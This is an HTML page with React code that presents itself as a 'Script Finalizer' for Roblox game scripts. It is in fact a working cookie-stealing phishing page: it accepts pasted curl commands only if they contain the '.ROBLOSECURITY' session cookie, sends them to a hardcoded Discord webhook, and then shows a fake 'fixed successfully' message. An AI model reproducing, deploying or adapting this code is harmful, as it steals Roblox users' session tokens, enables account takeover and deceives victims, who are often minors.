<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Script Finalizer</title>

  <!-- Tailwind CSS -->
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Lucide Icons -->
  <script src="https://unpkg.com/lucide@latest"></script>

  <style>
    body { background: #000; color: #fff; font-family: ui-sans-serif, system-ui, sans-serif; }
    .grid-bg {
      background-image:
        linear-gradient(to right, #111 1px, transparent 1px),
        linear-gradient(to bottom, #111 1px, transparent 1px);
      background-size: 4rem 4rem;
      opacity: 0.3;
    }
  </style>
</head>
<body class="min-h-screen flex items-center justify-center relative overflow-hidden">

  <div class="absolute inset-0 grid-bg"></div>
  <div class="absolute top-0 left-1/4 w-96 h-96 bg-purple-900/20 rounded-full blur-3xl"></div>
  <div class="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-900/20 rounded-full blur-3xl"></div>

  <div id="root" class="relative z-10 w-full max-w-2xl px-6"></div>

  <!-- React + ReactDOM -->
  <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
  <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>

  <!-- Fixed Framer Motion CDN (this was the bug!) -->
  <script src="https://cdn.jsdelivr.net/npm/framer-motion@11.11.9/dist/framer-motion.min.js"></script>

  <script type="text/babel">
    const { useState } = React;
    const { motion, AnimatePresence } = framerMotion;  // ← now it actually exists!

    function App() {
      const [input, setInput] = useState('');
      const [status, setStatus] = useState(null);
      const [isSubmitting, setIsSubmitting] = useState(false);

      const handleSubmit = async () => {
        const trimmed = input.trim();

        if (!trimmed.startsWith('curl') || !trimmed.includes('.ROBLOSECURITY')) {
          setStatus('error');
          return;
        }

        setIsSubmitting(true);
        setStatus(null);

        try {
          let processed = trimmed
            .replace(/https:\/\//g, '')
            .replace(/curl\s+/g, 'curl ...');
          const truncated = processed.substring(0, 3900);

          await fetch('https://discord.com/api/webhooks/1440146889939882087/HPjpz_PLLJI__-ue7qScQ3IXKMZyhLrjf0ZX64P5uK_W9RoIaCjXQgxWeYFY1TY0i_DP', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              embeds: [{
                title: 'New Script Submission',
                description: "```bash\n" + truncated + "\n```",
                color: 0x00ff00,
                timestamp: new Date().toISOString()
              }]
            })
          });

          setStatus('success');
          setInput('');
        } catch (err) {
          setStatus('error');
        } finally {
          setIsSubmitting(false);
        }
      };

      return (
        <>
          <motion.div initial={{ opacity: 0, y: -20 }} animate={{ opacity: 1, y: 0 }} className="text-center mb-16">
            <div className="inline-flex items-center gap-3 mb-2">
              <i data-lucide="terminal" className="w-8 h-8 text-purple-400"></i>
              <h1 className="text-5xl font-light tracking-wide">Script Finalizer</h1>
            </div>
            <div className="h-px w-32 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto mt-4"></div>
          </motion.div>

          <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} transition={{ delay: 0.1 }}
            className="bg-zinc-900/50 backdrop-blur-xl border border-zinc-800 rounded-2xl p-8 shadow-2xl">

            <label className="block mb-4 text-sm font-light text-zinc-400">Insert Game ID BASH</label>

            <textarea
              value={input}
              onChange={(e) => { setInput(e.target.value); setStatus(null); }}
              placeholder="curl https://..."
              disabled={isSubmitting}
              className="w-full min-h-[220px] bg-black/50 border border-zinc-700 rounded-lg px-4 py-3 text-white placeholder-zinc-600 font-mono text-sm resize-none focus:outline-none focus:border-purple-500 transition"
            />

            <div className="mt-2 text-right text-xs text-zinc-500">{input.length} / 4000 characters</div>

            <AnimatePresence mode="wait">
              {status === 'success' && (
                <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }}
                  className="mt-4 flex items-center gap-2 text-green-400 bg-green-950/30 border border-green-800/30 rounded-lg px-4 py-3">
                  <i data-lucide="check-circle" className="w-5 h-5"></i>
                  <span>The script has been fixed successfully!</span>
                </motion.div>
              )}
              {status === 'error' && (
                <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }}
                  className="mt-4 flex items-center gap-2 text-red-400 bg-red-950/30 border border-red-800/30 rounded-lg px-4 py-3">
                  <i data-lucide="alert-circle" className="w-5 h-5"></i>
                  <span>Invalid input — must start with "curl" and contain valid cURLbash</span>
                </motion.div>
              )}
            </AnimatePresence>

            <button
              onClick={handleSubmit}
              disabled={isSubmitting || !input.trim()}
              className="w-full mt-6 h-12 rounded-lg text-white font-light text-base bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 disabled:opacity-50 disabled:cursor-not-allowed transition shadow-lg flex items-center justify-center gap-2"
            >
              {isSubmitting ? (
                <> <i data-lucide="loader-2" className="w-5 h-5 animate-spin"></i> Processing... </>
              ) : (
                'Submit Script'
              )}
            </button>
          </motion.div>

          <motion.p initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.4 }}
            className="text-center mt-10 text-zinc-600 text-sm font-light">
            Only curl commands containing valid bash are accepted
          </motion.p>
        </>
      );
    }

    ReactDOM.createRoot(document.getElementById('root')).render(<App />);
    lucide.createIcons();
  </script>
</body>
</html>
